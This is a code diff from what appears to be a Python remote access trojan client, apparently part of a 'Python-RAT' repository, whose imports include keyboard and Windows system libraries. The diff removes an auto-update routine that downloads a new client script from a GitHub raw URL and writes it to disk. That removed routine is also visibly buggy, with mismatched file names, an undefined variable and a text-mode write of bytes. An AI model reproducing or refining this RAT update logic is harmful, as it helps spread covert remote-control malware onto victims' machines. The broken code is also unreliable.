@@ -23,33 +23,7 @@ import time
 import keyboard
 import subprocess
 import configparser
-import requests
 
-
-localconfig = configparser.ConfigParser()
-localconfig.read('LOCALVERSIONINFO.ini')
-LOCALVERSION = localconfig['LocalVersionInfo']['ClientVersion']
-print("Local Version: " + LOCALVERSION)
-VersionDataURL = "https://raw.githubusercontent.com/finnaminope/Python-RAT-ScriptsAndPlugins/alpha/INETVERSIONINFO.ini"
-FileDataURL = "https://raw.githubusercontent.com/finnaminope/Python-RAT-ScriptsAndPlugins/beta/client.pyw"
-r = requests.get(VersionDataURL) # create HTTP response object
-with open("INETVERSIONINFO.ini",'w') as f:
-	f.write(r.content)
-
-config = configparser.ConfigParser()
-config.read('INETVERSION.ini')
-INETVERSION = config['INetVersionInfo']['ClientVersion']
-
-if LOCALVERSION < INETVERSION:
-    r = requests.get(FileDataURL)  
-    with open('file_name.pyw', 'wb') as f:
-        f.write(r.content)
-
-
-config['LocalVersionInfo']['ClientVersion'] = VERSION    # update
-
-with open(' LOCALVERSION.ini', 'w') as configfile:    # save
-    localconfig.write(configfile)
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
